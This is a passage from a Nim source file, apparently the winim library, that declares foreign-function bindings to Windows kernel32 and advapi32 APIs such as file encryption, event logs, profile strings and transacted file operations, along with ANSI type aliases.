WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc: "EncryptFileW".}  proc DecryptFile*(lpFileName: LPCWSTR, dwReserved: DWORD): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc: "DecryptFileW".}  proc FileEncryptionStatus*(lpFileName: LPCWSTR, lpStatus: LPDWORD): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc: "FileEncryptionStatusW".}  proc OpenEncryptedFileRaw*(lpFileName: LPCWSTR, ulFlags: ULONG, pvContext: ptr PVOID): DWORD {.winapi, stdcall, dynlib: "advapi32", importc: "OpenEncryptedFileRawW".}  proc lstrcmp*(lpString1: LPCWSTR, lpString2: LPCWSTR): int32 {.winapi, stdcall, dynlib: "kernel32", importc: "lstrcmpW".}  proc lstrcmpi*(lpString1: LPCWSTR, lpString2: LPCWSTR): int32 {.winapi, stdcall, dynlib: "kernel32", importc: "lstrcmpiW".}  proc lstrcpyn*(lpString1: LPWSTR, lpString2: LPCWSTR, iMaxLength: int32): LPWSTR {.winapi, stdcall, dynlib: "kernel32", importc: "lstrcpynW".}  proc lstrcpy*(lpString1: LPWSTR, lpString2: LPCWSTR): LPWSTR {.winapi, stdcall, dynlib: "kernel32", importc: "lstrcpyW".}  proc lstrcat*(lpString1: LPWSTR, lpString2: LPCWSTR): LPWSTR {.winapi, stdcall, dynlib: "kernel32", importc: "lstrcatW".}  proc lstrlen*(lpString: LPCWSTR): int32 {.winapi, stdcall, dynlib: "kernel32", importc: "lstrlenW".}  proc CreateSemaphore*(lpSemaphoreAttributes: LPSECURITY_ATTRIBUTES, lInitialCount: LONG, lMaximumCount: LONG, lpName: LPCWSTR): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc: "CreateSemaphoreW".}  proc CreateWaitableTimer*(lpTimerAttributes: LPSECURITY_ATTRIBUTES, bManualReset: WINBOOL, lpTimerName: LPCWSTR): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc: "CreateWaitableTimerW".}  proc LoadLibrary*(lpLibFileName: LPCWSTR): HMODULE {.winapi, stdcall, dynlib: "kernel32", importc: "LoadLibraryW".}  proc QueryFullProcessImageName*(hProcess: HANDLE, dwFlags: DWORD, lpExeName: LPWSTR, lpdwSize: PDWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "QueryFullProcessImageNameW".}  proc FatalAppExit*(uAction: UINT, lpMessageText: LPCWSTR): VOID {.winapi, stdcall, dynlib: "kernel32", importc: "FatalAppExitW".}  proc GetFirmwareEnvironmentVariable*(lpName: LPCWSTR, lpGuid: LPCWSTR, pBuffer: PVOID, nSize: DWORD): DWORD {.winapi, stdcall, dynlib: "kernel32", importc: "GetFirmwareEnvironmentVariableW".}  proc SetFirmwareEnvironmentVariable*(lpName: LPCWSTR, lpGuid: LPCWSTR, pValue: PVOID, nSize: DWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "SetFirmwareEnvironmentVariableW".}  proc FindResource*(hModule: HMODULE, lpName: LPCWSTR, lpType: LPCWSTR): HRSRC {.winapi, stdcall, dynlib: "kernel32", importc: "FindResourceW".}  proc EnumResourceTypes*(hModule: HMODULE, lpEnumFunc: ENUMRESTYPEPROCW, lParam: LONG_PTR): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "EnumResourceTypesW".}  proc EnumResourceNames*(hModule: HMODULE, lpType: LPCWSTR, lpEnumFunc: ENUMRESNAMEPROCW, lParam: LONG_PTR): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "EnumResourceNamesW".}  proc BeginUpdateResource*(pFileName: LPCWSTR, bDeleteExistingResources: WINBOOL): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc: "BeginUpdateResourceW".}  proc UpdateResource*(hUpdate: HANDLE, lpType: LPCWSTR, lpName: LPCWSTR, wLanguage: WORD, lpData: LPVOID, cb: DWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "UpdateResourceW".}  proc EndUpdateResource*(hUpdate: HANDLE, fDiscard: WINBOOL): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "EndUpdateResourceW".}  proc GlobalAddAtom*(lpString: LPCWSTR): ATOM {.winapi, stdcall, dynlib: "kernel32", importc: "GlobalAddAtomW".}  proc GlobalAddAtomEx*(lpString: LPCWSTR, Flags: DWORD): ATOM {.winapi, stdcall, dynlib: "kernel32", importc: "GlobalAddAtomExW".}  proc GlobalFindAtom*(lpString: LPCWSTR): ATOM {.winapi, stdcall, dynlib: "kernel32", importc: "GlobalFindAtomW".}  proc GlobalGetAtomName*(nAtom: ATOM, lpBuffer: LPWSTR, nSize: int32): UINT {.winapi, stdcall, dynlib: "kernel32", importc: "GlobalGetAtomNameW".}  proc AddAtom*(lpString: LPCWSTR): ATOM {.winapi, stdcall, dynlib: "kernel32", importc: "AddAtomW".}  proc FindAtom*(lpString: LPCWSTR): ATOM {.winapi, stdcall, dynlib: "kernel32", importc: "FindAtomW".}  proc GetAtomName*(nAtom: ATOM, lpBuffer: LPWSTR, nSize: int32): UINT {.winapi, stdcall, dynlib: "kernel32", importc: "GetAtomNameW".}  proc GetProfileInt*(lpAppName: LPCWSTR, lpKeyName: LPCWSTR, nDefault: INT): UINT {.winapi, stdcall, dynlib: "kernel32", importc: "GetProfileIntW".}  proc GetProfileString*(lpAppName: LPCWSTR, lpKeyName: LPCWSTR, lpDefault: LPCWSTR, lpReturnedString: LPWSTR, nSize: DWORD): DWORD {.winapi, stdcall, dynlib: "kernel32", importc: "GetProfileStringW".}  proc WriteProfileString*(lpAppName: LPCWSTR, lpKeyName: LPCWSTR, lpString: LPCWSTR): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "WriteProfileStringW".}  proc GetProfileSection*(lpAppName: LPCWSTR, lpReturnedString: LPWSTR, nSize: DWORD): DWORD {.winapi, stdcall, dynlib: "kernel32", importc: "GetProfileSectionW".}  proc WriteProfileSection*(lpAppName: LPCWSTR, lpString: LPCWSTR): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "WriteProfileSectionW".}  proc GetPrivateProfileInt*(lpAppName: LPCWSTR, lpKeyName: LPCWSTR, nDefault: INT, lpFileName: LPCWSTR): UINT {.winapi, stdcall, dynlib: "kernel32", importc: "GetPrivateProfileIntW".}  proc GetPrivateProfileString*(lpAppName: LPCWSTR, lpKeyName: LPCWSTR, lpDefault: LPCWSTR, lpReturnedString: LPWSTR, nSize: DWORD, lpFileName: LPCWSTR): DWORD {.winapi, stdcall, dynlib: "kernel32", importc: "GetPrivateProfileStringW".}  proc WritePrivateProfileString*(lpAppName: LPCWSTR, lpKeyName: LPCWSTR, lpString: LPCWSTR, lpFileName: LPCWSTR): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "WritePrivateProfileStringW".}  proc GetPrivateProfileSection*(lpAppName: LPCWSTR, lpReturnedString: LPWSTR, nSize: DWORD, lpFileName: LPCWSTR): DWORD {.winapi, stdcall, dynlib: "kernel32", importc: "GetPrivateProfileSectionW".}  proc WritePrivateProfileSection*(lpAppName: LPCWSTR, lpString: LPCWSTR, lpFileName: LPCWSTR): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "WritePrivateProfileSectionW".}  proc GetPrivateProfileSectionNames*(lpszReturnBuffer: LPWSTR, nSize: DWORD, lpFileName: LPCWSTR): DWORD {.winapi, stdcall, dynlib: "kernel32", importc: "GetPrivateProfileSectionNamesW".}  proc GetPrivateProfileStruct*(lpszSection: LPCWSTR, lpszKey: LPCWSTR, lpStruct: LPVOID, uSizeStruct: UINT, szFile: LPCWSTR): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "GetPrivateProfileStructW".}  proc WritePrivateProfileStruct*(lpszSection: LPCWSTR, lpszKey: LPCWSTR, lpStruct: LPVOID, uSizeStruct: UINT, szFile: LPCWSTR): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "WritePrivateProfileStructW".}  proc GetFirmwareEnvironmentVariableEx*(lpName: LPCWSTR, lpGuid: LPCWSTR, pBuffer: PVOID, nSize: DWORD, pdwAttribubutes: PDWORD): DWORD {.winapi, stdcall, dynlib: "kernel32", importc: "GetFirmwareEnvironmentVariableExW".}  proc SetFirmwareEnvironmentVariableEx*(lpName: LPCWSTR, lpGuid: LPCWSTR, pValue: PVOID, nSize: DWORD, dwAttributes: DWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "SetFirmwareEnvironmentVariableExW".}  proc GetSystemWow64Directory*(lpBuffer: LPWSTR, uSize: UINT): UINT {.winapi, stdcall, dynlib: "kernel32", importc: "GetSystemWow64DirectoryW".}  proc SetDllDirectory*(lpPathName: LPCWSTR): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "SetDllDirectoryW".}  proc GetDllDirectory*(nBufferLength: DWORD, lpBuffer: LPWSTR): DWORD {.winapi, stdcall, dynlib: "kernel32", importc: "GetDllDirectoryW".}  proc CreateDirectoryEx*(lpTemplateDirectory: LPCWSTR, lpNewDirectory: LPCWSTR, lpSecurityAttributes: LPSECURITY_ATTRIBUTES): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "CreateDirectoryExW".}  proc CreateDirectoryTransacted*(lpTemplateDirectory: LPCWSTR, lpNewDirectory: LPCWSTR, lpSecurityAttributes: LPSECURITY_ATTRIBUTES, hTransaction: HANDLE): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "CreateDirectoryTransactedW".}  proc RemoveDirectoryTransacted*(lpPathName: LPCWSTR, hTransaction: HANDLE): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "RemoveDirectoryTransactedW".}  proc GetFullPathNameTransacted*(lpFileName: LPCWSTR, nBufferLength: DWORD, lpBuffer: LPWSTR, lpFilePart: ptr LPWSTR, hTransaction: HANDLE): DWORD {.winapi, stdcall, dynlib: "kernel32", importc: "GetFullPathNameTransactedW".}  proc CreateFileTransacted*(lpFileName: LPCWSTR, dwDesiredAccess: DWORD, dwShareMode: DWORD, lpSecurityAttributes: LPSECURITY_ATTRIBUTES, dwCreationDisposition: DWORD, dwFlagsAndAttributes: DWORD, hTemplateFile: HANDLE, hTransaction: HANDLE, pusMiniVersion: PUSHORT, lpExtendedParameter: PVOID): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc: "CreateFileTransactedW".}  proc SetFileAttributesTransacted*(lpFileName: LPCWSTR, dwFileAttributes: DWORD, hTransaction: HANDLE): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "SetFileAttributesTransactedW".}  proc GetFileAttributesTransacted*(lpFileName: LPCWSTR, fInfoLevelId: GET_FILEEX_INFO_LEVELS, lpFileInformation: LPVOID, hTransaction: HANDLE): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "GetFileAttributesTransactedW".}  proc GetCompressedFileSize*(lpFileName: LPCWSTR, lpFileSizeHigh: LPDWORD): DWORD {.winapi, stdcall, dynlib: "kernel32", importc: "GetCompressedFileSizeW".}  proc DeleteFileTransacted*(lpFileName: LPCWSTR, hTransaction: HANDLE): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "DeleteFileTransactedW".}  proc GetCompressedFileSizeTransacted*(lpFileName: LPCWSTR, lpFileSizeHigh: LPDWORD, hTransaction: HANDLE): DWORD {.winapi, stdcall, dynlib: "kernel32", importc: "GetCompressedFileSizeTransactedW".}  proc FindFirstFileTransacted*(lpFileName: LPCWSTR, fInfoLevelId: FINDEX_INFO_LEVELS, lpFindFileData: LPVOID, fSearchOp: FINDEX_SEARCH_OPS, lpSearchFilter: LPVOID, dwAdditionalFlags: DWORD, hTransaction: HANDLE): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc: "FindFirstFileTransactedW".}  proc CopyFileTransacted*(lpExistingFileName: LPCWSTR, lpNewFileName: LPCWSTR, lpProgressRoutine: LPPROGRESS_ROUTINE, lpData: LPVOID, pbCancel: LPBOOL, dwCopyFlags: DWORD, hTransaction: HANDLE): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "CopyFileTransactedW".}  proc CheckNameLegalDOS8Dot3*(lpName: LPCWSTR, lpOemName: LPSTR, OemNameSize: DWORD, pbNameContainsSpaces: PBOOL, pbNameLegal: PBOOL): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "CheckNameLegalDOS8Dot3W".}  proc CopyFile*(lpExistingFileName: LPCWSTR, lpNewFileName: LPCWSTR, bFailIfExists: WINBOOL): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "CopyFileW".}  proc CopyFileEx*(lpExistingFileName: LPCWSTR, lpNewFileName: LPCWSTR, lpProgressRoutine: LPPROGRESS_ROUTINE, lpData: LPVOID, pbCancel: LPBOOL, dwCopyFlags: DWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "CopyFileExW".}  proc MoveFile*(lpExistingFileName: LPCWSTR, lpNewFileName: LPCWSTR): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "MoveFileW".}  proc MoveFileEx*(lpExistingFileName: LPCWSTR, lpNewFileName: LPCWSTR, dwFlags: DWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "MoveFileExW".}  proc MoveFileWithProgress*(lpExistingFileName: LPCWSTR, lpNewFileName: LPCWSTR, lpProgressRoutine: LPPROGRESS_ROUTINE, lpData: LPVOID, dwFlags: DWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "MoveFileWithProgressW".}  proc MoveFileTransacted*(lpExistingFileName: LPCWSTR, lpNewFileName: LPCWSTR, lpProgressRoutine: LPPROGRESS_ROUTINE, lpData: LPVOID, dwFlags: DWORD, hTransaction: HANDLE): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "MoveFileTransactedW".}  proc ReplaceFile*(lpReplacedFileName: LPCWSTR, lpReplacementFileName: LPCWSTR, lpBackupFileName: LPCWSTR, dwReplaceFlags: DWORD, lpExclude: LPVOID, lpReserved: LPVOID): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "ReplaceFileW".}  proc CreateHardLink*(lpFileName: LPCWSTR, lpExistingFileName: LPCWSTR, lpSecurityAttributes: LPSECURITY_ATTRIBUTES): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "CreateHardLinkW".}  proc CreateHardLinkTransacted*(lpFileName: LPCWSTR, lpExistingFileName: LPCWSTR, lpSecurityAttributes: LPSECURITY_ATTRIBUTES, hTransaction: HANDLE): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "CreateHardLinkTransactedW".}  proc GetNamedPipeHandleState*(hNamedPipe: HANDLE, lpState: LPDWORD, lpCurInstances: LPDWORD, lpMaxCollectionCount: LPDWORD, lpCollectDataTimeout: LPDWORD, lpUserName: LPWSTR, nMaxUserNameSize: DWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "GetNamedPipeHandleStateW".}  proc CallNamedPipe*(lpNamedPipeName: LPCWSTR, lpInBuffer: LPVOID, nInBufferSize: DWORD, lpOutBuffer: LPVOID, nOutBufferSize: DWORD, lpBytesRead: LPDWORD, nTimeOut: DWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "CallNamedPipeW".}  proc SetVolumeLabel*(lpRootPathName: LPCWSTR, lpVolumeName: LPCWSTR): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "SetVolumeLabelW".}  proc ClearEventLog*(hEventLog: HANDLE, lpBackupFileName: LPCWSTR): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc: "ClearEventLogW".}  proc BackupEventLog*(hEventLog: HANDLE, lpBackupFileName: LPCWSTR): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc: "BackupEventLogW".}  proc OpenEventLog*(lpUNCServerName: LPCWSTR, lpSourceName: LPCWSTR): HANDLE {.winapi, stdcall, dynlib: "advapi32", importc: "OpenEventLogW".}  proc RegisterEventSource*(lpUNCServerName: LPCWSTR, lpSourceName: LPCWSTR): HANDLE {.winapi, stdcall, dynlib: "advapi32", importc: "RegisterEventSourceW".}  proc OpenBackupEventLog*(lpUNCServerName: LPCWSTR, lpFileName: LPCWSTR): HANDLE {.winapi, stdcall, dynlib: "advapi32", importc: "OpenBackupEventLogW".}  proc ReadEventLog*(hEventLog: HANDLE, dwReadFlags: DWORD, dwRecordOffset: DWORD, lpBuffer: LPVOID, nNumberOfBytesToRead: DWORD, pnBytesRead: ptr DWORD, pnMinNumberOfBytesNeeded: ptr DWORD): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc: "ReadEventLogW".}  proc ReportEvent*(hEventLog: HANDLE, wType: WORD, wCategory: WORD, dwEventID: DWORD, lpUserSid: PSID, wNumStrings: WORD, dwDataSize: DWORD, lpStrings: ptr LPCWSTR, lpRawData: LPVOID): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc: "ReportEventW".}  proc IsBadStringPtr*(lpsz: LPCWSTR, ucchMax: UINT_PTR): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "IsBadStringPtrW".}  proc LookupPrivilegeValue*(lpSystemName: LPCWSTR, lpName: LPCWSTR, lpLuid: PLUID): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc: "LookupPrivilegeValueW".}  proc LookupPrivilegeName*(lpSystemName: LPCWSTR, lpLuid: PLUID, lpName: LPWSTR, cchName: LPDWORD): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc: "LookupPrivilegeNameW".}  proc LookupPrivilegeDisplayName*(lpSystemName: LPCWSTR, lpName: LPCWSTR, lpDisplayName: LPWSTR, cchDisplayName: LPDWORD, lpLanguageId: LPDWORD): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc: "LookupPrivilegeDisplayNameW".}  proc BuildCommDCB*(lpDef: LPCWSTR, lpDCB: LPDCB): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "BuildCommDCBW".}  proc BuildCommDCBAndTimeouts*(lpDef: LPCWSTR, lpDCB: LPDCB, lpCommTimeouts: LPCOMMTIMEOUTS): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "BuildCommDCBAndTimeoutsW".}  proc CommConfigDialog*(lpszName: LPCWSTR, hWnd: HWND, lpCC: LPCOMMCONFIG): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "CommConfigDialogW".}  proc GetDefaultCommConfig*(lpszName: LPCWSTR, lpCC: LPCOMMCONFIG, lpdwSize: LPDWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "GetDefaultCommConfigW".}  proc SetDefaultCommConfig*(lpszName: LPCWSTR, lpCC: LPCOMMCONFIG, dwSize: DWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "SetDefaultCommConfigW".}  proc GetComputerName*(lpBuffer: LPWSTR, nSize: LPDWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "GetComputerNameW".}  proc SetComputerName*(lpComputerName: LPCWSTR): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "SetComputerNameW".}  proc DnsHostnameToComputerName*(Hostname: LPCWSTR, ComputerName: LPWSTR, nSize: LPDWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "DnsHostnameToComputerNameW".}  proc GetUserName*(lpBuffer: LPWSTR, pcbBuffer: LPDWORD): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc: "GetUserNameW".}  proc LogonUser*(lpszUsername: LPCWSTR, lpszDomain: LPCWSTR, lpszPassword: LPCWSTR, dwLogonType: DWORD, dwLogonProvider: DWORD, phToken: PHANDLE): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc: "LogonUserW".}  proc LogonUserEx*(lpszUsername: LPCWSTR, lpszDomain: LPCWSTR, lpszPassword: LPCWSTR, dwLogonType: DWORD, dwLogonProvider: DWORD, phToken: PHANDLE, ppLogonSid: ptr PSID, ppProfileBuffer: ptr PVOID, pdwProfileLength: LPDWORD, pQuotaLimits: PQUOTA_LIMITS): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc: "LogonUserExW".}  proc OpenPrivateNamespace*(lpBoundaryDescriptor: LPVOID, lpAliasPrefix: LPCWSTR): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc: "OpenPrivateNamespaceW".}  proc GetCurrentHwProfile*(lpHwProfileInfo: LPHW_PROFILE_INFOW): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc: "GetCurrentHwProfileW".}  proc VerifyVersionInfo*(lpVersionInformation: LPOSVERSIONINFOEXW, dwTypeMask: DWORD, dwlConditionMask: DWORDLONG): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "VerifyVersionInfoW".}  proc CreateJobObject*(lpJobAttributes: LPSECURITY_ATTRIBUTES, lpName: LPCWSTR): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc: "CreateJobObjectW".}  proc OpenJobObject*(dwDesiredAccess: DWORD, bInheritHandle: WINBOOL, lpName: LPCWSTR): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc: "OpenJobObjectW".}  proc FindFirstVolumeMountPoint*(lpszRootPathName: LPCWSTR, lpszVolumeMountPoint: LPWSTR, cchBufferLength: DWORD): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc: "FindFirstVolumeMountPointW".}  proc FindNextVolumeMountPoint*(hFindVolumeMountPoint: HANDLE, lpszVolumeMountPoint: LPWSTR, cchBufferLength: DWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "FindNextVolumeMountPointW".}  proc SetVolumeMountPoint*(lpszVolumeMountPoint: LPCWSTR, lpszVolumeName: LPCWSTR): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "SetVolumeMountPointW".}  proc CreateActCtx*(pActCtx: PCACTCTXW): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc: "CreateActCtxW".}  proc FindActCtxSectionString*(dwFlags: DWORD, lpExtensionGuid: ptr GUID, ulSectionId: ULONG, lpStringToFind: LPCWSTR, ReturnedData: PACTCTX_SECTION_KEYED_DATA): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "FindActCtxSectionStringW".}  proc CreateSymbolicLink*(lpSymlinkFileName: LPCWSTR, lpTargetFileName: LPCWSTR, dwFlags: DWORD): BOOLEAN {.winapi, stdcall, dynlib: "kernel32", importc: "CreateSymbolicLinkW".}  proc CreateSymbolicLinkTransacted*(lpSymlinkFileName: LPCWSTR, lpTargetFileName: LPCWSTR, dwFlags: DWORD, hTransaction: HANDLE): BOOLEAN {.winapi, stdcall, dynlib: "kernel32", importc: "CreateSymbolicLinkTransactedW".}  proc LookupAccountNameLocal*(lpAccountName: LPCWSTR, Sid: PSID, cbSid: LPDWORD, ReferencedDomainName: LPWSTR, cchReferencedDomainName: LPDWORD, peUse: PSID_NAME_USE): WINBOOL {.winapi, inline.} = LookupAccountNameW(nil, lpAccountName, Sid, cbSid, ReferencedDomainName, cchReferencedDomainName, peUse)  proc LookupAccountSidLocal*(Sid: PSID, Name: LPWSTR, cchName: LPDWORD, ReferencedDomainName: LPWSTR, cchReferencedDomainName: LPDWORD, peUse: PSID_NAME_USE): WINBOOL {.winapi, inline.} = LookupAccountSidW(nil, Sid, Name, cchName, ReferencedDomainName, cchReferencedDomainName, peUse)when winimAnsi:  type    WIN32_FIND_DATA* = WIN32_FIND_DATAA    PWIN32_FIND_DATA* = PWIN32_FIND_DATAA    LPWIN32_FIND_DATA* = LPWIN32_FIND_DATAA    ENUMRESLANGPROC* = ENUMRESLANGPROCA    ENUMRESNAMEPROC* = ENUMRESNAMEPROCA    ENUMRESTYPEPROC* = ENUMRESTYPEPROCA    PGET_MODULE_HANDLE_EX* = PGET_MODULE_HANDLE_EXA    STARTUPINFO* = STARTUPINFOA    LPSTARTUPINFO* = LPSTARTUPINFOA    STARTUPINFOEX* = STARTUPINFOEXA    LPSTARTUPINFOEX* = LPSTARTUPINFOEXA    HW_PROFILE_INFO* = HW_PROFILE_INFOA    LPHW_PROFILE_INFO* = LPHW_PROFILE_INFOA    ACTCTX* = ACTCTXA    PACTCTX* = PACTCTXA    PCACTCTX* = PCACTCTXA  const    GET_SYSTEM_WOW64_DIRECTORY_NAME_T_A* = GET_SYSTEM_WOW64_DIRECTORY_NAME_A_A    GET_SYSTEM_WOW64_DIRECTORY_NAME_T_W* = GET_SYSTEM_WOW64_DIRECTORY_NAME_A_W    GET_SYSTEM_WOW64_DIRECTORY_NAME_T_T* = GET_SYSTEM_WOW64_DIRECTORY_NAME_A_T  proc GetEnvironmentStrings*(): LPCH {.winapi, stdcall, dynlib: "kernel32", importc.}  proc SetEnvironmentStrings*(NewEnvironment: LPCH): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "SetEnvironmentStringsA".}  proc GetShortPathName*(lpszLongPath: LPCSTR, lpszShortPath: LPSTR, cchBuffer: DWORD): DWORD {.winapi, stdcall, dynlib: "kernel32", importc: "GetShortPathNameA".}  proc OpenMutex*(dwDesiredAccess: DWORD, bInheritHandle: WINBOOL, lpName: LPCSTR): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc: "OpenMutexA".}  proc OpenSemaphore*(dwDesiredAccess: DWORD, bInheritHandle: WINBOOL, lpName: LPCSTR): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc: "OpenSemaphoreA".}  proc OpenWaitableTimer*(dwDesiredAccess: DWORD, bInheritHandle: WINBOOL, lpTimerName: LPCSTR): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc: "OpenWaitableTimerA".}  proc CreateFileMapping*(hFile: HANDLE, lpFileMappingAttributes: LPSECURITY_ATTRIBUTES, flProtect: DWORD, dwMaximumSizeHigh: DWORD, dwMaximumSizeLow: DWORD, lpName: LPCSTR): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc: "CreateFileMappingA".}  proc OpenFileMapping*(dwDesiredAccess: DWORD, bInheritHandle: WINBOOL, lpName: LPCSTR): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc: "OpenFileMappingA".}  proc GetLogicalDriveStrings*(nBufferLength: DWORD, lpBuffer: LPSTR): DWORD {.winapi, stdcall, dynlib: "kernel32", importc: "GetLogicalDriveStringsA".}  proc CreateSemaphoreEx*(lpSemaphoreAttributes: LPSECURITY_ATTRIBUTES, lInitialCount: LONG, lMaximumCount: LONG, lpName: LPCSTR, dwFlags: DWORD, dwDesiredAccess: DWORD): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc: "CreateSemaphoreExA".}  proc CreateWaitableTimerEx*(lpTimerAttributes: LPSECURITY_ATTRIBUTES, lpTimerName: LPCSTR, dwFlags: DWORD, dwDesiredAccess: DWORD): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc: "CreateWaitableTimerExA".}  proc CreateFileMappingNuma*(hFile: HANDLE, lpFileMappingAttributes: LPSECURITY_ATTRIBUTES, flProtect: DWORD, dwMaximumSizeHigh: DWORD, dwMaximumSizeLow: DWORD, lpName: LPCSTR, nndPreferred: DWORD): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc: "CreateFileMappingNumaA".}  proc GetStartupInfo*(lpStartupInfo: LPSTARTUPINFOA): VOID {.winapi, stdcall, dynlib: "kernel32", importc: "GetStartupInfoA".}  proc FindResourceEx*(hModule: HMODULE, lpType: LPCSTR, lpName: LPCSTR, wLanguage: WORD): HRSRC {.winapi, stdcall, dynlib: "kernel32", importc: "FindResourceExA".}  proc GetTempPath*(nBufferLength: DWORD, lpBuffer: LPSTR): DWORD {.winapi, stdcall, dynlib: "kernel32", importc: "GetTempPathA".}  proc GetTempFileName*(lpPathName: LPCSTR, lpPrefixString: LPCSTR, uUnique: UINT, lpTempFileName: LPSTR): UINT {.winapi, stdcall, dynlib: "kernel32", importc: "GetTempFileNameA".}  proc DefineDosDevice*(dwFlags: DWORD, lpDeviceName: LPCSTR, lpTargetPath: LPCSTR): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "DefineDosDeviceA".}  proc QueryDosDevice*(lpDeviceName: LPCSTR, lpTargetPath: LPSTR, ucchMax: DWORD): DWORD {.winapi, stdcall, dynlib: "kernel32", importc: "QueryDosDeviceA".}  proc CreateNamedPipe*(lpName: LPCSTR, dwOpenMode: DWORD, dwPipeMode: DWORD, nMaxInstances: DWORD, nOutBufferSize: DWORD, nInBufferSize: DWORD, nDefaultTimeOut: DWORD, lpSecurityAttributes: LPSECURITY_ATTRIBUTES): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc: "CreateNamedPipeA".}  proc WaitNamedPipe*(lpNamedPipeName: LPCSTR, nTimeOut: DWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "WaitNamedPipeA".}  proc GetVolumeInformation*(lpRootPathName: LPCSTR, lpVolumeNameBuffer: LPSTR, nVolumeNameSize: DWORD, lpVolumeSerialNumber: LPDWORD, lpMaximumComponentLength: LPDWORD, lpFileSystemFlags: LPDWORD, lpFileSystemNameBuffer: LPSTR, nFileSystemNameSize: DWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "GetVolumeInformationA".}  proc AccessCheckAndAuditAlarm*(SubsystemName: LPCSTR, HandleId: LPVOID, ObjectTypeName: LPSTR, ObjectName: LPSTR, SecurityDescriptor: PSECURITY_DESCRIPTOR, DesiredAccess: DWORD, GenericMapping: PGENERIC_MAPPING, ObjectCreation: WINBOOL, GrantedAccess: LPDWORD, AccessStatus: LPBOOL, pfGenerateOnClose: LPBOOL): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc: "AccessCheckAndAuditAlarmA".}  proc AccessCheckByTypeAndAuditAlarm*(SubsystemName: LPCSTR, HandleId: LPVOID, ObjectTypeName: LPCSTR, ObjectName: LPCSTR, SecurityDescriptor: PSECURITY_DESCRIPTOR, PrincipalSelfSid: PSID, 